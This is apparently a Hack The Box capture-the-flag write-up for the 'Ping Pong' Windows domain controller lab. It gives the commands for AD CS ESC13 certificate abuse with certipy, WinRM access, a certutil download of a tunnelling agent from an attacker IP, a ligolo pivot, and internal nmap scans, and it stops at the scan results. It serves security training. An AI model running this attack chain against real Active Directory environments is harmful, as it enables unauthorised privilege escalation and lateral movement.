---
title: Ping Pong
parent: HTB
grand_parent: Writeups
nav_order: 1
---
| OS | Windows(DC) |
| Difficulty | Insane |

# Initial Access
## hosts

```zsh
sudo vi /etc/hosts
```

```zsh
cat /etc/hosts | grep ping.htb
```
![](../../../assets/images/Pasted%20image%2020260507174138.png)

## Get Ticket

```zsh
faketime ‘now + 8 hours’ impacket-getTGT  ping.htb/c.roberts:‘AssumedBreach123’ -dc-ip 10.129.50.56
```
![](../../../assets/images/Pasted%20image%2020260507174145.png)

# 1. certipy find
Purpose: Enumerate exploitable certificate templates

What it does:

Enumerate CAs and templates registered in AD CS
Analyze the settings of each template
Determine which templates are vulnerable (ESC1–ESC13)

Specifically:

ENROLLEE_SUPPLIES_SUBJECT
Client Authentication
Any Purpose
Authenticated Users enrollment enabled

Automatically determines if the template can be used for privilege escalation by checking flags like these

👉 Key points to look for in the output:

Vulnerable: True
ESC13 (the main target of this PingPong attack)
Template name (e.g., TemporaryWinRM)
```zsh
KRB5CCNAME=c.roberts.ccache \
    faketime ‘now + 8 hours’ certipy-ad find -u c.roberts@ping.htb -k -no-pass \
    -target dc1.ping.htb -dc-ip 10.129.50.56 -vulnerable -enabled -text
```
![](../../../assets/images/Pasted%20image%2020260507174256.png)

# 2 certipy req
Role: Certificate Issuance (Request)

What it does:

Submits a certificate request to the CA using the specified template
If the conditions are met, a certificate is issued

In the context of this exercise (ESC13):

The template is mapped to a specific group
→ When the certificate is obtained, the user is treated as that group

In other words:
👉 “The phase where you obtain a privileged certificate”

Output:

.pfx file (private key + certificate)
```zsh
KRB5CCNAME=c.roberts.ccache \
    faketime ‘now + 8 hours’ certipy-ad req -u c.roberts@ping.htb -k -no-pass \
    -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.50.56 \
    -ca ping-DC1-CA -template TemporaryWinRM
```
![](../../../assets/images/Pasted%20image%2020260507174305.png)

# 3 certipy auth
Role: Kerberos authentication using a certificate (TGT acquisition)

What it does:

Performs PKINIT authentication using a .pfx file
Performs “certificate login” against AD
Acquires a Kerberos TGT

Result:

A .ccache file is generated

👉 This is super important:
It converts
“certificate → Kerberos ticket”
without requiring a password

```zsh
faketime ‘now + 8 hours’ \
    certipy-ad auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb \
    -dc-ip 10.129.50.56 
```
![](../../../assets/images/Pasted%20image%2020260507174322.png)

```zsh
vi krb5_pingpong.conf
```

```zsh
cat krb5_pingpong.conf
[libdefaults]
    default_realm = PING.HTB

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
```
![](../../../assets/images/Pasted%20image%2020260507174335.png)

```zsh
export KRB5_CONFIG=krb5_pingpong.conf  
```

```zsh
KRB5CCNAME=c.roberts.ccache \
faketime ‘now + 8 hours’ \
evil-winrm -i dc1.ping.htb -r ping.htb
```


# Internal Discovery
![](../../../assets/images/Pasted%20image%2020260507174342.png)

## nltest
```zsh
nltest /domain_trusts
```
![](../../../assets/images/Pasted%20image%2020260507174349.png)

## BloodHound
![](../../../assets/images/Pasted%20image%2020260507174403.png)

## Download ligolo agent
```zsh
certutil -urlcache -f http://10.10.15.168/agent.exe agent.exe
```


![](../../../assets/images/Pasted%20image%2020260507174410.png)

![](../../../assets/images/Pasted%20image%2020260507174414.png)

## Connect to ligolo
```zsh
cp ~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy . 
./proxy -selfcert
```
![](../../../assets/images/Pasted%20image%2020260507174504.png)

```zsh
.\agent.exe -connect 10.10.15.168:11601 -ignore-cert
```
![](../../../assets/images/Pasted%20image%2020260507174453.png)

![](../../../assets/images/Pasted%20image%2020260507174426.png)

![](../../../assets/images/Pasted%20image%2020260507174438.png)

# Lateral Movement
## Host scan
```zsh
nmap -Pn -p 80,445,3389,22,135 192.168.2.2-10 --open
```
![](../../../assets/images/Pasted%20image%2020260507174522.png)
192.168.2.2 arive

## Port scan
```zsh
nmap -Pn -p- 192.168.2.2 --min-rate=5000 --open
```
![](../../../assets/images/Pasted%20image%2020260507174527.png)

## Port scan
```zsh
nmap -Pn 192.168.2.2 -A
```
![](../../../assets/images/Pasted%20image%2020260507174534.png)
![](../../../assets/images/Pasted%20image%2020260507174540.png)
pong.htb


